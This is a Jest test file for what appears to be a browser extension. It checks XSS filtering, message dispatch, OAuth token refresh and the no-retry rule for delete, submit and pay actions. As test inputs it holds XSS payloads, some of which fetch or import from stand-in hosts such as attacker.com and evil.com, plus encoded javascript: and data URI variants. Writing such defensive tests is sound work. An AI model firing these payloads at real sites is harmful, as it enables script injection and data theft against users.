/**
 * Security tests: Validate all Phase 1-2 vulnerability fixes
 * Tests XSS prevention, token security, message security, action validation
 */

import { ActionValidator } from '../../src/shared/validators';
import { MessageDispatcher } from '../../src/background/message-dispatcher';
import { TokenManager } from '../../src/background/token-store-refactored';
import { executeActionWithRetry } from '../../src/shared/retry';

describe('Security: XSS Prevention (IMPL-1.1)', () => {
  test('prevents onclick attribute injection', () => {
    const malicious = 'button onclick="alert(1)"';
    const result = ActionValidator.isValidSelector(malicious);
    expect(result.valid).toBe(false);
  });

  test('prevents onerror attribute injection', () => {
    const malicious = 'img onerror="fetch(\'http://attacker.com\')"';
    const result = ActionValidator.isValidSelector(malicious);
    expect(result.valid).toBe(false);
  });

  test('prevents javascript: protocol', () => {
    const malicious = 'javascript:void(fetch("http://evil.com"))';
    const result = ActionValidator.isValidSelector(malicious);
    expect(result.valid).toBe(false);
  });

  test('prevents script tag injection', () => {
    const malicious = '<script>alert("xss")</script>';
    const result = ActionValidator.isValidSelector(malicious);
    expect(result.valid).toBe(false);
  });

  test('prevents Unicode escape sequences', () => {
    const malicious = '\\u003cscript\\u003ealert(1)';
    const result = ActionValidator.isValidSelector(malicious);
    expect(result.valid).toBe(false);
  });

  test('prevents HTML entity encoding XSS', () => {
    const malicious = '&lt;script&gt;alert(1)';
    const result = ActionValidator.isValidSelector(malicious);
    expect(result.valid).toBe(false);
  });

  test('accepts valid CSS selectors', () => {
    const valid = 'button.submit-btn[data-action="click"]';
    const result = ActionValidator.isValidSelector(valid);
    expect(result.valid).toBe(true);
  });

  test('prevents XSS in payload objects', () => {
    const payload = {
      content: '<img src=x onerror=alert(1)>',
    };
    const result = ActionValidator.isValidPayload(payload);
    expect(result.valid).toBe(false);
  });

  test('accepts safe payloads', () => {
    const payload = {
      name: 'John Doe',
      email: 'john@example.com',
      items: [1, 2, 3],
    };
    const result = ActionValidator.isValidPayload(payload);
    expect(result.valid).toBe(true);
  });
});

describe('Security: Message Handling (IMPL-1.2)', () => {
  let dispatcher: MessageDispatcher;

  beforeEach(() => {
    dispatcher = new MessageDispatcher();
  });

  test('rejects messages with missing type', async () => {
    const mockSender = { id: 'test' } as any;
    const message = { data: 'test' }; // No type field

    await expect(dispatcher.dispatch(message, mockSender)).rejects.toThrow(
      'type property'
    );
  });

  test('rejects messages with unregistered handler', async () => {
    const mockSender = { id: 'test' } as any;
    const message = { type: 'UNKNOWN_MESSAGE' };

    await expect(dispatcher.dispatch(message, mockSender)).rejects.toThrow(
      'No handler registered'
    );
  });

  test('enforces single listener pattern', () => {
    if (typeof chrome === 'undefined') {
      (global as any).chrome = {
        runtime: { onMessage: { addListener: jest.fn() } },
      };
    }

    const addListenerSpy = jest.spyOn(chrome.runtime.onMessage, 'addListener');

    dispatcher.start();
    dispatcher.start(); // Second start should not add another listener

    expect(addListenerSpy).toHaveBeenCalledTimes(1);

    addListenerSpy.mockRestore();
  });

  test('handler timeout prevents hanging requests', async () => {
    const slowHandler = jest.fn(
      () => new Promise((resolve) => setTimeout(resolve, 5000))
    );

    dispatcher = new MessageDispatcher({ timeoutMs: 100 });
    dispatcher.register('SLOW', slowHandler);

    const mockSender = {} as any;
    const message = { type: 'SLOW' };

    await expect(dispatcher.dispatch(message, mockSender)).rejects.toThrow(
      'timeout'
    );
  });
});

describe('Security: Token Management (IMPL-1.4)', () => {
  test('concurrent token requests return same token', async () => {
    const mockOAuth = {
      exchange: jest.fn(async () => ({
        accessToken: 'token-123',
        expiresInSeconds: 3600,
        tokenType: 'Bearer',
      })),
    };

    const manager = new TokenManager(
      { clientId: 'test', redirectUri: 'https://test.com', scopes: [] },
      mockOAuth as any
    );

    // Set expired token to trigger refresh
    manager.setTokens({
      accessToken: 'old-token',
      expiresAt: Date.now() - 1000,
    });

    // Concurrent requests
    const [token1, token2, token3] = await Promise.all([
      manager.getAccessToken(),
      manager.getAccessToken(),
      manager.getAccessToken(),
    ]);

    // All should get same token
    expect(token1).toBe(token2);
    expect(token2).toBe(token3);
    expect(token1).toBe('token-123');

    // API called only ONCE
    expect(mockOAuth.exchange).toHaveBeenCalledTimes(1);
  });

  test('token expiry buffer enforced (5 minutes)', async () => {
    const mockOAuth = {
      exchange: jest
        .fn()
        .mockResolvedValueOnce({
          accessToken: 'new-token',
          expiresInSeconds: 3600,
          tokenType: 'Bearer',
        })
        .mockResolvedValueOnce({
          accessToken: 'newer-token',
          expiresInSeconds: 3600,
          tokenType: 'Bearer',
        }),
    };

    const manager = new TokenManager(
      { clientId: 'test', redirectUri: 'https://test.com', scopes: [] },
      mockOAuth as any
    );

    // Set token that expires in 4 minutes (within buffer)
    manager.setTokens({
      accessToken: 'token',
      expiresAt: Date.now() + 4 * 60 * 1000,
    });

    // Should trigger refresh due to buffer
    const token = await manager.getAccessToken();
    expect(token).toBe('new-token');
  });
});

describe('Security: Action Validation (IMPL-1.3)', () => {
  test('critical actions (delete) fail-fast without retry', async () => {
    const executor = jest.fn().mockRejectedValue(new Error('timeout'));

    const result = await executeActionWithRetry(
      { type: 'delete', selector: 'button.delete' },
      executor,
      { criticalActions: ['delete'] }
    );

    expect(result.success).toBe(false);
    expect(result.attempts).toBe(1);
    expect(executor).toHaveBeenCalledTimes(1); // No retry
  });

  test('submit actions never retry', async () => {
    const executor = jest.fn().mockRejectedValue(new Error('transient'));

    const result = await executeActionWithRetry(
      { type: 'submit', selector: 'form' },
      executor
    );

    expect(result.attempts).toBe(1);
  });

  test('pay actions never retry', async () => {
    const executor = jest.fn().mockRejectedValue(new Error('timeout'));

    const result = await executeActionWithRetry(
      { type: 'pay', selector: 'button.pay' },
      executor
    );

    expect(result.attempts).toBe(1);
  });

  test('transient errors retried for normal actions', async () => {
    const executor = jest
      .fn()
      .mockRejectedValueOnce(new Error('timeout'))
      .mockResolvedValueOnce({ success: true });

    const result = await executeActionWithRetry(
      { type: 'click', selector: 'button' },
      executor,
      { baseBackoffMs: 10 }
    );

    expect(result.success).toBe(true);
    expect(result.attempts).toBe(2);
    expect(executor).toHaveBeenCalledTimes(2);
  });

  test('permanent errors dont retry', async () => {
    const executor = jest
      .fn()
      .mockRejectedValue(new Error('Invalid selector syntax'));

    const result = await executeActionWithRetry(
      { type: 'click', selector: 'button' },
      executor
    );

    expect(result.success).toBe(false);
    expect(result.attempts).toBe(1);
  });
});

describe('Security: Authentication Flow', () => {
  test('invalid tokens rejected', () => {
    const validation = ActionValidator.isValidPayload({
      token: '<script>alert(1)</script>',
    });
    expect(validation.valid).toBe(false);
  });

  test('API keys not passed in URLs', () => {
    const validation = ActionValidator.isValidUrl(
      'https://api.example.com/data?key=secret-key-123'
    );
    // While technically valid URL, logging would be handled separately
    expect(validation.valid).toBe(true);
  });
});

describe('Security: Content Injection Prevention', () => {
  test('prevents DOM-based XSS via event handlers', () => {
    const inputs = [
      'button" onmouseover="alert(1)',
      'div onclick="eval(this.innerHTML)"',
      'iframe onload="fetch(evil.com)"',
      'svg onload="import(evil.com)"',
    ];

    for (const input of inputs) {
      const result = ActionValidator.isValidSelector(input);
      expect(result.valid).toBe(false);
    }
  });

  test('prevents code execution via data URIs', () => {
    const malicious = 'data:text/html,<script>alert(1)</script>';
    const result = ActionValidator.isValidSelector(malicious);
    expect(result.valid).toBe(false);
  });

  test('prevents bypasses with encoding', () => {
    const encoded = '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;';
    const result = ActionValidator.isValidSelector(encoded);
    expect(result.valid).toBe(false);
  });
});
